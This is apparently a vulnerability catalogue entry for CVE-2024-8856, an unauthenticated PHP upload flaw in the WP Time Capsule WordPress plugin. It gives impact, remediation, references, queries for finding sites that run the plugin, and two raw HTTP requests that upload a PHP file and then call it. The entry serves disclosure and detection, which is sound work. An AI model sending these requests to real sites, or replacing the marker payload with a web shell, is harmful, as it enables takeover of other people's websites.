---
layout: post
cve_id: CVE-2024-8856
title: WP Time Capsule Plugin - Remote Code Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-8856.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-8856.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Unauthenticated attackers can upload arbitrary PHP files to the server through
  missing file type validation, enabling remote code execution and complete WordPress
  site compromise.

  '
remediation: 'Update WP Time Capsule plugin to a version later than 1.22.21 that addresses
  the arbitrary file upload vulnerability and implements proper file type validation
  and direct file access prevention.

  '
reference:
- https://hacked.be/posts/CVE-2024-8856
- https://plugins.trac.wordpress.org/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php
- https://plugins.trac.wordpress.org/changeset/3188325/
- https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3153289%40wp-time-capsule&new=3153289%40wp-time-capsule&sfp_email=&sfph_mail=
- https://www.wordfence.com/threat-intel/vulnerabilities/id/fdc2de78-5601-461f-b2f0-c80b592ccb1b?source=cve
- https://nvd.nist.gov/vuln/detail/CVE-2024-8856
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-8856
  cwe-id: CWE-434
  epss-score: 0.9295
  epss-percentile: 0.99763
metadata:
  verified: true
  max-request: 2
  fofa-query: body="/wp-content/plugins/wp-time-capsule/"
  publicwww-query: /wp-content/plugins/wp-time-capsule/
tags:
- cve
- cve2024
- intrusive
- file-upload
- wordpress
- wp-plugin
- wp
- wp-time-capsule
- rce
- vkev
- vuln
---

## üîç Vulnerability Description
The Backup and Staging by WP Time Capsule plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the the UploadHandler.php file and no direct file access prevention in all versions up to, and including, 1.22.21. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.


## üåê HTTP Request
```nohighlight
POST /wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0 Safari/602.4.8
Connection: close
Content-Length: 265
Content-Type: multipart/form-data;boundary=---------------------------26670583928903275361770089688
Accept-Encoding: gzip
-----------------------------26670583928903275361770089688
Content-Disposition: form-data; name="files"; filename="EppGbXzj.php"
Content-Type: text/php
<?php echo base64_decode("bWFsaWNpb3Vz"); ?>
-----------------------------26670583928903275361770089688--
```

```nohighlight
GET /wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/files/EppGbXzj.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

